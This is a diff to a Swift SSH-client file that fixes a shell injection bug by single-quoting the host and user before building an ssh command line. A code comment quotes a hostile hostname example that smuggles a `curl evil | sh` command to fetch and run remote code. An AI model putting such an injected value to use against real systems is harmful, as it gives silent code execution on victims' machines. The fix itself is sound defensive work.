@@ -2,14 +2,23 @@ import Foundation
 
 public enum SSHCommand {
     /// The shell command line that opens an interactive SSH session for a connection:
-    /// `ssh [-p PORT] [user@]host`. The port flag is omitted at the default (22), and the
+    /// `ssh [-p PORT] '[user@]host'`. The port flag is omitted at the default (22), and the
     /// `user@` prefix is dropped when no (non-blank) user is set. Pure — the same string is
     /// used whether the session is launched from a double-click, a menu, or a test.
     ///
+    /// **Every interpolated value is single-quoted**, because the result is a *shell* command line
+    /// that the terminal executes locally. `host` and `user` used to go in raw, on the reasoning
+    /// that the only way to set them was to type them into the connection editor — self-inflicted,
+    /// and no worse than typing the same thing at the prompt. iCloud sync (#83) ended that: a
+    /// connection record now arrives from another device, so a hostile hostname like
+    /// `example.com; curl evil | sh; #` would have been silent local code execution on every Mac
+    /// signed into the account. Quoting is the whole fix, and quoting *unconditionally* is the
+    /// point — a "does this need escaping?" test is a thing to get wrong later.
+    ///
     /// A non-blank `custom` command is folded onto the end as `-t '<custom>'`, forcing a remote
-    /// pty so interactive programs (e.g. `tmux new -n dev`) work. The command is wrapped in
-    /// single quotes with POSIX `'\''` escaping so spaces and metacharacters survive both the
-    /// local launch and ssh's own re-joining of the remote command.
+    /// pty so interactive programs (e.g. `tmux new -n dev`) work — this one was always quoted, so
+    /// spaces and metacharacters survive both the local launch and ssh's own re-joining of the
+    /// remote command.
     ///
     /// When `busyShim` is non-nil *and* `custom` launches tmux, the tmux command is rewritten to
     /// carry the busy-spinner integration into the remote session (#96): it enables tmux's
@@ -19,15 +28,21 @@ public enum SSHCommand {
     public static func command(host: String, port: Int, user: String?,
                                custom: String? = nil, busyShim: String? = nil) -> String {
         var parts = ["ssh"]
+        // `port` is an Int, so it cannot carry a metacharacter and needs no quoting.
         if port != 22 { parts.append("-p \(port)") }
         let trimmedUser = user?.trimmingCharacters(in: .whitespaces) ?? ""
-        parts.append(trimmedUser.isEmpty ? host : "\(trimmedUser)@\(host)")
+        parts.append(singleQuoted(trimmedUser.isEmpty ? host : "\(trimmedUser)@\(host)"))
         var line = parts.joined(separator: " ")
         guard let raw = custom?.trimmingCharacters(in: .whitespaces), !raw.isEmpty else { return line }
-        let remote = remoteCommand(custom: raw, busyShim: busyShim)
-        let escaped = remote.replacingOccurrences(of: "'", with: "'\\''")
-        line += " -t '\(escaped)'"
+        line += " -t \(singleQuoted(remoteCommand(custom: raw, busyShim: busyShim)))"
         return line
+    }
+
+    /// Wrap a value so the shell passes it through as one literal argument. POSIX single quotes
+    /// protect everything except a single quote itself, which is closed, escaped and reopened —
+    /// the standard `'\''` dance. There is no input this fails to neutralise.
+    private static func singleQuoted(_ value: String) -> String {
+        "'\(value.replacingOccurrences(of: "'", with: "'\\''"))'"
     }
 
     /// The command actually run on the remote host. Identity for a plain custom command; for a tmux
